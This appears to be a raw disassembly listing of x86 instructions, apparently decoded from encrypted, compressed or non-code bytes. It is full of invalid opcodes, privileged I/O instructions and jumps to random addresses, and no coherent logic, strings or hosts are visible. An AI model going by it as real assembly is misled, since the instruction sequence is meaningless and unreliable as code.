  40dfa0:	jno    0x40df27
  40dfa2:	out    0x83,eax
  40dfa4:	push   es
  40dfa5:	add    BYTE PTR [edx+eax*8-0x17f5341],dh
  40dfac:	sti    
  40dfad:	ffreep st(4)
  40dfaf:	in     eax,0xdf
  40dfb1:	fild   DWORD PTR [esi+0x38]
  40dfb4:	adc    dh,BYTE PTR [ebx+0x7a37e9d6]
  40dfba:	and    BYTE PTR [eax+0x789df539],0x53
  40dfc1:	mov    bl,0xf3
  40dfc3:	std    
  40dfc4:	lods   al,BYTE PTR ds:[esi]
  40dfc5:	std    
  40dfc6:	pop    ds
  40dfc7:	jmp    0x6119:0xdda13339
  40dfce:	push   esp
  40dfcf:	sub    al,0x72
  40dfd2:	imul   ebp,DWORD PTR [ebp+edi*4+0x7c6b4d72],0x8b72cabf
  40dfdd:	hlt    
  40dfde:	ins    DWORD PTR es:[edi],dx
  40dfdf:	mov    cl,0x8e
  40dfe1:	(bad)  
  40dfe3:	jmp    0x40e01c
  40dfe5:	popf   
  40dfe6:	(bad)  
  40dfe7:	jge    0x40e01f
  40dfe9:	push   edx
  40dfea:	daa    
  40dfeb:	push   es
  40dfec:	dec    edx
  40dfed:	mov    esi,esi
  40dfef:	pop    ebp
  40dff0:	out    0x13,al
  40dff2:	(bad)  es:[eax+0x2ebaf16b]
  40dff9:	repnz or DWORD PTR [edx+0x42],0xb3ff4a19
  40e001:	cwde   
  40e002:	pop    esi
  40e003:	jns    0x40e078
  40e005:	jns    0x40dfed
  40e007:	je     0x40e05d
  40e009:	push   ebp
  40e00a:	neg    DWORD PTR [edx+0x455b1e68]
  40e010:	mov    eax,ds:0xac481545
  40e015:	inc    edi
  40e016:	aas    
  40e017:	sbb    DWORD PTR [edx+0x366b46f3],eax
  40e01d:	mov    dh,0x5d
  40e01f:	lahf   
  40e020:	lock adc DWORD PTR [edx+0x1071cd57],edx
  40e027:	int    0x27
  40e029:	ficom  DWORD PTR [eax-0x13e067b4]
  40e02f:	repnz rol BYTE PTR [ebx+0x5cbd850b],cl
  40e036:	js     0x40e072
  40e038:	icebp  
  40e039:	mov    ch,0x34
  40e03b:	jp     0x40e066
  40e03d:	push   esi
  40e03e:	ret    0x9837
  40e041:	push   cs
  40e042:	out    0x20,eax
  40e044:	inc    ebx
  40e045:	cs mov ecx,0xa025b739
  40e04b:	dec    edx
  40e04c:	loop   0x40dfde
  40e04e:	push   ss
  40e04f:	std    
  40e050:	fwait
  40e051:	pop    edx
  40e052:	inc    edi
  40e053:	inc    ecx
  40e054:	jne    0x40e012
  40e056:	pop    esp
  40e057:	bound  ecx,QWORD PTR [edx+eax*2+0x1e]
  40e05b:	inc    ebx
  40e05c:	xor    al,0xb3
  40e05e:	dec    ecx
  40e05f:	pop    eax
  40e060:	jo     0x40e0bb
  40e062:	mov    ebp,0xb658eb6d
  40e067:	mov    ecx,0xfe33cb7f
  40e06c:	jne    0x40e0bf
  40e06e:	push   es
  40e06f:	mov    esp,0xfccb7c1e
  40e074:	push   ss
  40e075:	push   ecx
  40e076:	sub    ecx,ecx
  40e078:	push   0xbb5fd023
  40e07d:	aam    0xc1
  40e07f:	jle    0x40e036
  40e081:	mov    eax,0xad8f23ef
  40e086:	rol    DWORD PTR [edx+0x2e],0x4b
  40e08a:	or     dl,dl
  40e08c:	stos   DWORD PTR es:[edi],eax
  40e08d:	fucom  st(1)
  40e08f:	jae    0x40e0d0
  40e091:	pop    edi
  40e092:	mov    al,ds:0x229a49e6
  40e097:	mov    ds:0x5479e43b,al
  40e09c:	dec    edx
  40e09d:	aam    0x77
  40e09f:	and    eax,0x641a618c
  40e0a4:	out    0x9e,eax
  40e0a6:	and    cl,BYTE PTR [edx-0x70]
  40e0a9:	nop
  40e0aa:	push   ecx
  40e0ab:	mov    bh,BYTE PTR [ebp+0x1713eea5]
  40e0b1:	and    DWORD PTR [edx-0x3b279cc7],0x38
  40e0b8:	pop    ecx
  40e0b9:	jb     0x40e0f1
  40e0bb:	inc    esp
  40e0bc:	xor    esi,eax
  40e0be:	jnp    0x40e078
  40e0c0:	and    ah,BYTE PTR [edx-0x54bbb6b4]
  40e0c6:	dec    edi
  40e0c7:	lods   eax,DWORD PTR ds:[esi]
  40e0c8:	pop    es
  40e0c9:	int    0x8b
  40e0cb:	fcom   DWORD PTR [edx+0x12]
  40e0ce:	cmp    eax,DWORD PTR [esi+0x6d0fa820]
  40e0d4:	fsubr  DWORD PTR [eax-0x3e]
  40e0d7:	push   ebx
  40e0d8:	dec    ecx
  40e0d9:	cmp    edx,DWORD PTR [eax]
  40e0db:	sahf   
  40e0dc:	xchg   ecx,eax
  40e0dd:	adc    eax,0x2d65cde9
  40e0e2:	test   eax,0xc7a9b819
  40e0e7:	dec    ebp
  40e0e8:	or     al,0xe1
  40e0ea:	push   cs
  40e0eb:	cmp    DWORD PTR [ecx+0x75],edx
  40e0ee:	das    
  40e0ef:	loope  0x40e0af
  40e0f1:	xor    ah,dh
  40e0f3:	sar    ebp,1
  40e0f5:	and    bl,dl
  40e0f7:	sti    
  40e0f8:	push   0xea985b55
  40e0fd:	jmp    0xd00ad737
  40e102:	mov    bl,BYTE PTR [edi]
  40e104:	cli    
  40e105:	push   bp
  40e107:	sbb    al,0x9e
  40e109:	clc    
  40e10a:	es jnp 0x40e096
  40e10d:	call   0x28828bc7
  40e112:	out    0xbe,al
  40e114:	cmp    edi,DWORD PTR [edx-0x8]
  40e117:	jmp    0x2c46180b
  40e11c:	fistp  QWORD PTR [edx-0x7a]
  40e11f:	sbb    esi,eax
  40e121:	and    BYTE PTR [ecx+0x70],bh
  40e124:	test   DWORD PTR [edi+0x6c848ae3],ebx
  40e12a:	mov    edi,0xdeac19ce
  40e12f:	sar    DWORD PTR [ebp-0x361c6721],1
  40e135:	mov    DWORD PTR [esp+ebx*8],0x8396242c
  40e13c:	xor    eax,0xe0866abe
  40e141:	adc    DWORD PTR [ebp+0x31],esi
  40e144:	pop    edi
  40e145:	std    
  40e146:	imul   DWORD PTR [eax]
  40e148:	adc    BYTE PTR [esi-0x7d],ah
  40e14b:	js     0x40e18a
  40e14d:	mov    dh,0x8a
  40e14f:	inc    ecx
  40e150:	xor    al,0x4e
  40e152:	xchg   BYTE PTR [edx+0x6679f34f],cl
  40e158:	shr    BYTE PTR [ebx+0x41d3182d],cl
  40e15e:	or     ebp,DWORD PTR [eax-0x121d5e97]
  40e164:	lock and BYTE PTR [edx+0x3c474c15],bl
  40e16b:	leave  
  40e16c:	xchg   ebx,eax
  40e16d:	jb     0x40e143
  40e16f:	lods   eax,DWORD PTR ds:[esi]
  40e170:	xchg   esi,eax
  40e171:	jb     0x40e1d6
  40e173:	sbb    DWORD PTR [ebp-0x8e1f7fe],esp
  40e179:	loopne 0x40e1a8
  40e17b:	(bad)  
  40e17c:	shl    BYTE PTR [edi+0x57],0x33
  40e180:	(bad)  
  40e181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e182:	mov    bh,0xd0
  40e184:	adc    ecx,DWORD PTR [edi+eax*1+0x74ab5762]
  40e18b:	ret    0x3757
  40e18e:	jae    0x40e1ba
  40e190:	xchg   ebx,eax
  40e191:	outs   dx,DWORD PTR ds:[esi]
  40e192:	xor    BYTE PTR [eax-0x5],dl
  40e195:	std    
  40e196:	xchg   DWORD PTR [ebx+ebx*4],eax
  40e199:	ins    BYTE PTR es:[edi],dx
  40e19a:	popa   
  40e19b:	test   ah,bl
  40e19d:	es out 0x77,al
  40e1a0:	and    bl,dh
  40e1a2:	xor    al,0xa
  40e1a4:	loope  0x40e18e
  40e1a6:	mov    ch,0xd
  40e1a8:	ss and al,cl
  40e1ab:	sar    BYTE PTR [ecx+edi*1],cl
  40e1ae:	mov    dh,0xfe
  40e1b0:	dec    esi
  40e1b1:	or     DWORD PTR [eax+0x4fdf442b],edx
  40e1b7:	les    ebp,FWORD PTR [ecx+ecx*1-0x20]
  40e1bb:	cmp    DWORD PTR [ebx],edi
  40e1bd:	xor    DWORD PTR [ebx+0x4c967d4],esp
  40e1c3:	pop    ebx
  40e1c4:	and    dh,BYTE PTR [esi+eiz*4-0x6da014ea]
  40e1cb:	test   BYTE PTR [edi-0x36],ch
  40e1ce:	into   
  40e1cf:	js     0x40e1e0
  40e1d1:	pop    ebp
  40e1d2:	cdq    
  40e1d3:	cli    
  40e1d4:	in     al,dx
  40e1d5:	mov    al,0xdc
  40e1d7:	les    ebx,FWORD PTR [ebp-0x71f7239]
  40e1dd:	pop    ds
  40e1de:	iret   
  40e1df:	mov    fs:0x4f66b937,eax
  40e1e5:	jg     0x40e233
  40e1e7:	ret    0xf0c3
  40e1ea:	in     eax,0xf7
  40e1ec:	sbb    eax,esp
  40e1ee:	and    DWORD PTR [eax+0x3ca5cb15],0xffffffe0
  40e1f5:	sub    bl,cl
  40e1f7:	stos   BYTE PTR es:[edi],al
  40e1f8:	mov    eax,fs
  40e1fa:	rcr    DWORD PTR [ecx],cl
  40e1fc:	ds js  0x40e241
  40e1ff:	sahf   
  40e200:	and    DWORD PTR es:[ebp+0x3c],esp
  40e204:	jecxz  0x40e26c
  40e206:	jmp    0x12d3632b
  40e20b:	mov    dl,0x64
  40e20d:	adc    ebx,edx
  40e20f:	fs ds jmp 0x7bc1fdaf
  40e216:	cli    
  40e217:	adc    BYTE PTR [ecx-0x3a],0x9a
  40e21b:	xchg   esi,eax
  40e21c:	outs   dx,DWORD PTR ds:[esi]
  40e21d:	xchg   DWORD PTR [edx-0x132dbe21],ebx
  40e223:	xor    DWORD PTR [esi+0x46],0xffffff8e
  40e227:	(bad)  
  40e228:	xchg   ebp,eax
  40e229:	jmp    0x69b0721d
  40e22e:	dec    esp
  40e22f:	(bad)  
  40e230:	cmc    
  40e231:	adc    ebx,esp
  40e233:	aam    0x13
  40e235:	mov    ebx,0xc72acdd1
  40e23a:	mov    ds:0x45e3ff4b,eax
  40e23f:	out    dx,al
  40e240:	mov    WORD PTR [ebx+0x41],cs
  40e243:	mov    eax,0x33cc0078
  40e248:	pop    edx
  40e249:	inc    esp
  40e24a:	inc    esp
  40e24b:	push   ebx
  40e24c:	cmp    eax,0xd3d45438
  40e251:	aaa    
  40e252:	inc    edi
  40e253:	pop    edx
  40e254:	push   esi
  40e255:	data16 (bad) 
  40e257:	in     eax,0x2d
  40e259:	xorps  xmm1,XMMWORD PTR [edx-0x79]
  40e25d:	cmp    DWORD PTR [ecx],ebx
  40e25f:	mov    ah,0x46
  40e261:	sub    edx,DWORD PTR [edi-0x23619095]
  40e267:	pusha  
  40e268:	xchg   ecx,eax
  40e269:	out    0x49,al
  40e26b:	or     DWORD PTR [ecx],0x6
  40e26e:	pop    ds
  40e26f:	pop    ecx
  40e270:	inc    edi
  40e271:	aaa    
  40e272:	jg     0x40e2ac
  40e274:	add    eax,0x2ecad31
  40e279:	cmc    
  40e27a:	ret    
  40e27b:	inc    ecx
  40e27c:	xor    bh,ch
  40e27e:	mov    ah,0xd0
  40e280:	sbb    edx,eax
  40e282:	test   BYTE PTR ds:0xbdd7cd55,ah
  40e288:	idiv   DWORD PTR [ebx-0x28]
  40e28b:	mov    cl,0x50
  40e28d:	adc    eax,DWORD PTR [esi]
  40e28f:	scas   al,BYTE PTR es:[edi]
  40e290:	mov    edx,0xaac74c5c
  40e295:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40e297:	fnstsw WORD PTR [ebp+0x3d]
  40e29a:	lods   al,BYTE PTR ds:[esi]
  40e29b:	test   BYTE PTR [ecx+0x1c7c2bcb],al
  40e2a1:	or     BYTE PTR [eax],ch
  40e2a3:	jg     0x40e26b
  40e2a5:	or     eax,0x6b5e39e5
  40e2aa:	retf   
  40e2ab:	jle    0x40e32c
  40e2ad:	(bad)  
  40e2ae:	push   ds
  40e2af:	jno    0x40e27c
  40e2b1:	xchg   esp,eax
  40e2b2:	inc    ebp
  40e2b3:	les    ebp,FWORD PTR ds:0x7dac79e8
  40e2b9:	shl    BYTE PTR [ebx+0x12],1
  40e2bc:	cmp    dh,cl
  40e2be:	sbb    BYTE PTR [esi-0xd],al
  40e2c1:	aas    
  40e2c2:	xor    al,0x33
  40e2c4:	retf   0x2598
  40e2c7:	pop    eax
  40e2c8:	(bad)  
  40e2ca:	inc    ecx
  40e2cb:	in     al,dx
  40e2cc:	loop   0x40e2d3
  40e2ce:	jmp    0x344d756a
  40e2d3:	shl    BYTE PTR [esi],1
  40e2d5:	mov    bh,0xd4
  40e2d7:	and    eax,0xe94e6e18
  40e2dc:	ds inc esi
  40e2de:	mov    ds:0x1e0ea2fa,al
  40e2e3:	push   ecx
  40e2e4:	jno    0x40e296
  40e2e6:	push   edx
  40e2e7:	mov    cs,WORD PTR [esi-0x11]
  40e2ea:	mov    eax,0xb594db23
  40e2ef:	arpl   WORD PTR [ebx],dx
  40e2f1:	mov    ebx,0xbecd5bb
  40e2f6:	cmp    edi,DWORD PTR [edi-0x35]
  40e2f9:	and    BYTE PTR [ecx+0x31],0x58
  40e2fd:	in     al,0x7b
  40e2ff:	jmp    0x55925aa5
  40e304:	iret   
  40e305:	mov    ah,ch
  40e307:	add    al,0x4c
  40e309:	sub    dh,BYTE PTR [ebx-0x39]
  40e30c:	sbb    BYTE PTR [esi+0x3e5ccc12],al
  40e312:	jmp    0x40e390
  40e314:	mov    ecx,0x64df8aa0
  40e319:	shr    DWORD PTR [esi],cl
  40e31b:	push   ebx
  40e31c:	pushf  
  40e31d:	hlt    
  40e31e:	rcr    eax,0x38
  40e321:	sar    DWORD PTR [ebx+0x5ad75af9],cl
  40e327:	scas   al,BYTE PTR es:[edi]
  40e328:	push   esp
  40e329:	adc    ah,dl
  40e32b:	or     eax,0x7f1b4ca1
  40e330:	je     0x40e2c7
  40e332:	jae    0x40e395
  40e334:	mov    dh,dh
  40e336:	out    0x85,al
  40e338:	aas    
  40e339:	jo     0x40e39b
  40e33b:	out    0x18,eax
  40e33d:	xor    esp,DWORD PTR [ebp+eax*2-0x2721b7a1]
  40e344:	push   esp
  40e345:	stos   DWORD PTR es:[edi],eax
  40e346:	sbb    BYTE PTR [edx+0x4b],0xbf
  40e34a:	pop    ebx
  40e34b:	aad    0x13
  40e34d:	retf   0x1677
  40e350:	cmp    eax,0xd45753b3
  40e355:	aad    0x6e
  40e357:	fwait
  40e358:	and    eax,0x6ac97060
  40e35d:	cmp    ecx,ebx
  40e35f:	fcmovbe st,st(5)
  40e361:	ret    0xfad7
  40e364:	mov    al,ds:0x600f54a4
  40e369:	(bad)  
  40e36b:	inc    eax
  40e36c:	rol    DWORD PTR [ebp-0x46ccdbae],cl
  40e372:	add    DWORD PTR [esi+eax*2],0x6f3b554
  40e379:	shl    esp,cl
  40e37b:	push   ds
  40e37c:	xchg   ebx,eax
  40e37d:	and    DWORD PTR [edx+edi*8+0x27c6c8ff],ecx
  40e384:	out    dx,al
  40e385:	mov    ebx,?
  40e387:	cwde   
  40e388:	fmul   QWORD PTR [edi-0x3a2abfc0]
  40e38e:	xor    DWORD PTR [edx+edi*4-0xdf3fa82],0x38
  40e396:	inc    edx
  40e397:	mov    eax,ds:0xef205788
  40e39c:	push   ss
  40e39d:	sbb    esp,DWORD PTR [ebp-0x2a]
  40e3a0:	mov    ?,ecx
  40e3a2:	aaa    
  40e3a3:	add    dh,dl
  40e3a5:	jecxz  0x40e383
  40e3a7:	push   eax
  40e3a8:	jle    0x40e417
  40e3aa:	sbb    bh,BYTE PTR [ecx]
  40e3ac:	mov    eax,ds:0x1842332a
  40e3b1:	or     ah,BYTE PTR [ebx-0x37]
  40e3b4:	ds jmp 0x5fc8fcf4
  40e3ba:	xor    ebp,DWORD PTR ds:0x1c09c1b
  40e3c0:	and    ebx,ebp
  40e3c2:	jmp    0x40e3ee
  40e3c4:	test   eax,0x45ec1b34
  40e3c9:	cmp    eax,0xfedb1df8
  40e3ce:	jmp    0x40e3aa
  40e3d0:	pusha  
  40e3d1:	lods   eax,DWORD PTR es:[esi]
  40e3d3:	call   0x7a83813c
  40e3d8:	(bad)  
  40e3d9:	push   esi
  40e3da:	sub    eax,0x37d2bd9f
  40e3df:	inc    edx
  40e3e0:	rcl    dh,0x3a
  40e3e3:	push   ss
  40e3e4:	popf   
  40e3e5:	adc    al,0xaf
  40e3e7:	mov    al,ds:0x92fcedcb
  40e3ec:	test   BYTE PTR ds:0x3d39f493,0x9d
  40e3f3:	jp     0x40e401
  40e3f5:	jnp    0x40e3bb
  40e3f7:	and    esp,DWORD PTR [ebp+0x501a6e81]
  40e3fd:	test   BYTE PTR [edx+0x22f44d0d],ch
  40e403:	inc    ebp
  40e404:	mov    bh,0xac
  40e406:	inc    edi
  40e407:	and    ah,BYTE PTR [ebx-0x72]
  40e40a:	push   eax
  40e40b:	dec    eax
  40e40c:	cdq    
  40e40d:	repz mov bl,0x94
  40e410:	mov    edi,0x5518389c
  40e415:	dec    edi
  40e416:	fistp  WORD PTR [ebp-0x56]
  40e419:	push   ds
  40e41a:	std    
  40e41b:	and    ebx,ecx
  40e41d:	mov    ebp,ecx
  40e41f:	cmp    ebx,esp
  40e421:	aam    0x7c
  40e423:	leave  
  40e424:	xor    BYTE PTR [ebx],cl
  40e426:	data16 scas al,BYTE PTR es:[edi]
  40e428:	xlat   BYTE PTR ds:[ebx]
  40e429:	jl     0x40e480
  40e42b:	in     eax,0x80
  40e42d:	pusha  
  40e42e:	pop    ebx
  40e42f:	push   ds
  40e430:	sbb    al,cl
  40e432:	mov    ah,0x13
  40e434:	inc    esi
  40e435:	jbe    0x40e469
  40e437:	pusha  
  40e438:	rcr    DWORD PTR [edi-0x49dfdecb],0x5c
  40e43f:	mov    esi,0x31c230bc
  40e444:	out    0x63,al
  40e446:	xor    dh,BYTE PTR [esi+ecx*8-0x6c6fc641]
  40e44d:	inc    edi
  40e44e:	xor    edi,esi
  40e450:	sub    eax,0x2f570756
  40e455:	outs   dx,BYTE PTR ds:[esi]
  40e456:	das    
  40e457:	mov    ebp,0x92f4c14a
  40e45c:	or     eax,0x9762ee79
  40e461:	fsub   QWORD PTR [eax-0x7572e8d2]
  40e467:	js     0x40e469
  40e469:	stos   DWORD PTR es:[edi],eax
  40e46a:	loop   0x40e4d8
  40e46c:	outs   dx,BYTE PTR ss:[esi]
  40e46e:	lahf   
  40e46f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e470:	das    
  40e471:	push   ss
  40e472:	scas   eax,DWORD PTR es:[edi]
  40e473:	inc    esi
  40e474:	lds    eax,FWORD PTR [ebx+0x37631ec4]
  40e47a:	fisttp DWORD PTR [edi-0x68]
  40e47d:	mov    esi,0xed7ce41b
  40e482:	xchg   edi,eax
  40e483:	mov    WORD PTR [eax],gs
  40e485:	push   ebx
  40e486:	add    eax,0x94cd5724
  40e48b:	inc    esi
  40e48c:	je     0x40e440
  40e48e:	jne    0x40e469
  40e490:	sar    DWORD PTR [ecx],0x9c
  40e493:	push   0xffffff89
  40e495:	mov    ebp,0x2a
	...
  40e512:	add    BYTE PTR [eax],al
  40e514:	pop    ebx
  40e515:	ins    DWORD PTR es:[edi],dx
  40e516:	add    esi,DWORD PTR ds:0x6f7f7f37
  40e51c:	pop    eax
  40e51d:	je     0x40e4cc
  40e51f:	sar    BYTE PTR [edi],1
  40e521:	dec    eax
  40e522:	push   ds
  40e523:	pop    eax
  40e524:	stos   DWORD PTR es:[edi],eax
  40e525:	xchg   edx,eax
  40e526:	add    BYTE PTR [eax],al
  40e528:	imul   eax,DWORD PTR [edi],0x0
  40e52b:	add    BYTE PTR [ecx-0x21f180c6],ah
  40e531:	cld    
  40e532:	jmp    0x199944f1
  40e537:	(bad)  
  40e538:	sbb    cl,cl
  40e53a:	adc    eax,0x7728a6b5
  40e53f:	(bad)  
  40e541:	push   fs
  40e543:	sub    cl,BYTE PTR [ebx+eax*4-0x8]
  40e547:	neg    BYTE PTR [edi+0x4e]
  40e54a:	ror    BYTE PTR [esi+0x543af52c],0x1d
  40e551:	in     eax,0xc4
  40e553:	fs dec esi
  40e555:	add    ebx,DWORD PTR [edx-0x7c]
  40e558:	cmc    
  40e559:	(bad)  [eax-0x3905e4a1]
  40e55f:	pop    esi
  40e560:	pop    ds
  40e561:	mov    bl,0x30
  40e563:	and    eax,0xc4ab4258
  40e568:	push   0x65911478
  40e56d:	into   
  40e56e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e56f:	aaa    
  40e570:	shl    edi,0x23
  40e573:	mov    ah,BYTE PTR ds:0x10aea444
  40e579:	push   cs
  40e57a:	mov    BYTE PTR [eax+edx*1],al
  40e57d:	rcr    DWORD PTR [edx-0x3b888fcd],0xfe
  40e584:	test   eax,0x71acf71
  40e589:	add    eax,0x49af5e6a
  40e58e:	data16 sar BYTE PTR ss:[edx],0xbe
  40e593:	out    0x2f,eax
  40e595:	xchg   edi,eax
  40e596:	jbe    0x40e594
  40e598:	push   es
  40e599:	sar    DWORD PTR [edi],1
  40e59b:	push   edi
  40e59c:	mov    bl,0x73
  40e59e:	dec    esi
  40e59f:	sar    DWORD PTR [edx+0x7b],0x22
  40e5a3:	mov    eax,ds:0x9404c556
  40e5a8:	aas    
  40e5a9:	fsub   QWORD PTR [edx]
  40e5ab:	and    eax,0xd2cd3a1e
  40e5b0:	ins    DWORD PTR es:[edi],dx
  40e5b1:	mov    ds:0xe88f5543,al
  40e5b6:	and    DWORD PTR [ebx-0x1cf18787],ecx
  40e5bc:	inc    edi
  40e5bd:	mov    bh,0x13
  40e5bf:	gs nop
  40e5c1:	addr16 cdq 
  40e5c3:	push   cs
  40e5c4:	ds cmp eax,0x58755183
  40e5ca:	dec    esp
  40e5cb:	sub    DWORD PTR [ecx+ebp*8],edx
  40e5ce:	adc    ebp,DWORD PTR [edx+0x29]
  40e5d1:	stos   BYTE PTR es:[edi],al
  40e5d2:	jno    0x40e5af
  40e5d4:	lods   eax,DWORD PTR ds:[esi]
  40e5d5:	cmp    al,0x74
  40e5d7:	shr    DWORD PTR [edx],1
  40e5d9:	jae    0x40e597
  40e5db:	pop    ecx
  40e5dc:	outs   dx,BYTE PTR ds:[esi]
  40e5dd:	fs (bad) 
  40e5df:	fsubr  DWORD PTR [edi-0x25ed7c68]
  40e5e5:	cdq    
  40e5e6:	fst    st(2)
  40e5e8:	out    0x40,al
  40e5ea:	jbe    0x40e601
  40e5ec:	adc    ch,BYTE PTR [edx+0x1f]
  40e5ef:	test   BYTE PTR [ebx+0xd],dh
  40e5f2:	or     BYTE PTR [edx-0x42],dh
  40e5f5:	push   0x16
  40e5f7:	in     al,dx
  40e5f8:	cmp    al,0x30
  40e5fa:	loop   0x40e5c4
  40e5fc:	jmp    0x444d19cb
  40e601:	fwait
  40e602:	stc    
  40e603:	lock cmp eax,0x2dfd4edc
  40e609:	and    dl,ah
  40e60b:	cwde   
  40e60c:	xchg   edi,eax
  40e60d:	ret    0xc734
  40e610:	add    DWORD PTR [ecx],esp
  40e612:	jp     0x40e645
  40e614:	pop    eax
  40e615:	jns    0x40e621
  40e617:	and    ah,BYTE PTR [ecx-0x52d14c6e]
  40e61d:	push   eax
  40e61e:	add    dh,al
  40e620:	and    esp,ebx
  40e622:	cli    
  40e623:	fbstp  TBYTE PTR [eax]
  40e625:	sbb    al,0x14
  40e627:	pop    ecx
  40e628:	sub    edx,DWORD PTR [eax]
  40e62a:	in     eax,dx
  40e62b:	pop    ebx
  40e62c:	fsub   QWORD PTR [eax]
  40e62e:	adc    al,BYTE PTR [edi]
  40e630:	das    
  40e631:	xor    cl,bh
  40e633:	mov    dl,BYTE PTR [ebx]
  40e635:	jg     0x40e695
  40e637:	add    ch,0x35
  40e63a:	jbe    0x40e65d
  40e63c:	sub    eax,0xd2e80cc3
  40e641:	xor    bl,BYTE PTR [esp+eiz*2-0x2a3dd75f]
  40e648:	in     eax,dx
  40e649:	ins    BYTE PTR es:[edi],dx
  40e64a:	scas   al,BYTE PTR es:[edi]
  40e64b:	xchg   DWORD PTR [edx-0xb],ebx
  40e64e:	push   ds
  40e64f:	test   eax,0xa6576440
  40e654:	lock mov ebx,0x8cd86ec4
  40e65a:	pop    es
  40e65b:	jbe    0x40e624
  40e65d:	jno    0x40e629
  40e65f:	xchg   esi,ecx
  40e661:	(bad)  
  40e663:	stc    
  40e664:	iret   
  40e665:	cmp    dh,BYTE PTR ds:0x3c6a3303
  40e66b:	jge    0x40e621
  40e66d:	outs   dx,DWORD PTR ds:[esi]
  40e66e:	pop    eax
  40e66f:	inc    ecx
  40e670:	mov    ebp,0x5ef8fd1
  40e675:	icebp  
  40e676:	test   DWORD PTR ds:0x814c857a,ebp
  40e67c:	and    DWORD PTR [edx-0x66293505],0x7f
  40e683:	mov    dl,0x7f
  40e685:	push   ebx
  40e686:	icebp  
  40e687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e688:	sub    al,bh
  40e68a:	jbe    0x40e6eb
  40e68c:	or     esp,ebx
  40e68e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e68f:	pop    ds
  40e690:	mov    ss,WORD PTR [ebx+edx*8]
  40e693:	arpl   bx,ax
  40e695:	and    ebp,0x7c330111
  40e69b:	outs   dx,DWORD PTR ds:[esi]
  40e69c:	inc    esp
  40e69d:	mov    WORD PTR ds:0xa247c4a7,es
  40e6a3:	mov    al,cs:0x867fe2ab
  40e6a9:	mov    esp,0x426dd50a
  40e6ae:	mov    al,ds:0xe1abe5f0
  40e6b3:	xlat   BYTE PTR ds:[ebx]
  40e6b4:	ins    DWORD PTR es:[edi],dx
  40e6b5:	or     bl,bl
  40e6b7:	push   ds
  40e6b8:	fsub   QWORD PTR [edi]
  40e6ba:	and    eax,0x6a789673
  40e6bf:	jecxz  0x40e689
  40e6c1:	and    eax,0xcdfbbe0b
  40e6c6:	arpl   WORD PTR [eax+0x6f4ea6b5],cx
  40e6cc:	xor    al,0xfa
  40e6ce:	pop    esp
  40e6cf:	bound  ebp,QWORD PTR [ecx+0x47]
  40e6d2:	inc    ecx
  40e6d3:	aam    0x9f
  40e6d5:	mov    dl,0xaf
  40e6d7:	mov    bh,0x4e
  40e6d9:	ins    DWORD PTR es:[edi],dx
  40e6da:	add    ebp,DWORD PTR ds:0x75b1743b
  40e6e0:	sub    al,0x0
  40e6e2:	pop    ebp
  40e6e3:	mov    ebx,0xae08112a
  40e6e8:	call   0x4d24:0x4223e911
  40e6ef:	loop   0x40e696
  40e6f1:	out    0xa1,al
  40e6f3:	in     al,0x2d
  40e6f5:	pop    es
  40e6f6:	dec    ebx
  40e6f7:	sbb    dh,cl
  40e6f9:	imul   DWORD PTR [edx]
  40e6fb:	(bad)
  40e6fe:	aad    0x2e
  40e700:	retf   0xd1db
  40e703:	ins    BYTE PTR es:[edi],dx
  40e704:	xchg   ebx,eax
  40e705:	cmp    edx,DWORD PTR [esi+0x3ccd06d1]
  40e70b:	(bad)  
  40e70c:	and    BYTE PTR [eax-0x18],bl
  40e70f:	ds out 0x9a,eax
  40e712:	push   0xc03cfc3c
  40e717:	leave  
  40e718:	fsin   
  40e71a:	leave  
  40e71b:	repnz aas 
  40e71d:	pop    ebp
  40e71e:	and    BYTE PTR [ecx+0x31],cl
  40e721:	add    DWORD PTR [ebx-0x7b6cd50f],edi
  40e727:	cmc    
  40e728:	retf   
  40e729:	bound  ebx,QWORD PTR [ebx]
  40e72b:	out    dx,eax
  40e72c:	xchg   DWORD PTR [edx+0x48],eax
  40e72f:	repz xchg esi,eax
  40e731:	sub    BYTE PTR ds:0x1d81f020,0x6
  40e738:	sub    BYTE PTR [edx-0x77],bh
  40e73b:	adc    esi,DWORD PTR [edi]
  40e73d:	div    BYTE PTR [eax+esi*8-0x43b55761]
  40e744:	adc    BYTE PTR [esi],al
  40e746:	out    dx,eax
  40e747:	enter  0xffe1,0xbf
  40e74b:	fsub   DWORD PTR [edx]
  40e74d:	push   ecx
  40e74e:	in     eax,dx
  40e74f:	xor    BYTE PTR [eax+0x2f],al
  40e752:	mov    esp,0xf535c3c8
  40e757:	je     0x40e75e
  40e759:	jp     0x40e75e
  40e75b:	mov    ecx,0x782bc98f
  40e760:	adc    bh,BYTE PTR [edx-0x59a5b79a]
  40e766:	jne    0x40e7d6
  40e768:	add    al,0x87
  40e76a:	repnz pop edi
  40e76c:	lahf   
  40e76d:	mov    ah,0xd5
  40e76f:	adc    DWORD PTR [ebx],eax
  40e771:	iret   
  40e772:	into   
  40e773:	push   0x3c
  40e775:	in     al,dx
  40e776:	inc    BYTE PTR [edx+0x78f48e3b]
  40e77c:	(bad)  
  40e77d:	pop    ss
  40e77e:	cmp    BYTE PTR [esi],bh
  40e780:	nop
  40e781:	sub    DWORD PTR [esi+0x12925f4d],0x93bc1ccb
  40e78b:	xor    bh,BYTE PTR [ebx+0x1f06d4f6]
  40e791:	add    DWORD PTR [ebp+0x45],ecx
  40e794:	mov    cs,WORD PTR [ecx]
  40e796:	(bad)  
  40e797:	sub    DWORD PTR [edi-0x43fccebf],edi
  40e79d:	mov    ch,0x52
  40e79f:	mov    ebp,0xa9a9758f
  40e7a4:	jmp    0x40e7ea
  40e7a6:	inc    ebp
  40e7a7:	nop
  40e7a8:	je     0x40e816
  40e7aa:	cmp    eax,0xf1f5953f
  40e7af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7b0:	js     0x40e7f7
  40e7b2:	dec    edx
  40e7b3:	push   ebp
  40e7b4:	stc    
  40e7b5:	test   eax,0xc17d81de
  40e7ba:	es test eax,0x6ee21ad5
  40e7c0:	out    0xed,al
  40e7c2:	ret    
  40e7c3:	(bad)  
  40e7c4:	xchg   esp,eax
  40e7c5:	mov    ecx,0xc6619631
  40e7ca:	inc    edi
  40e7cb:	lods   al,BYTE PTR ds:[esi]
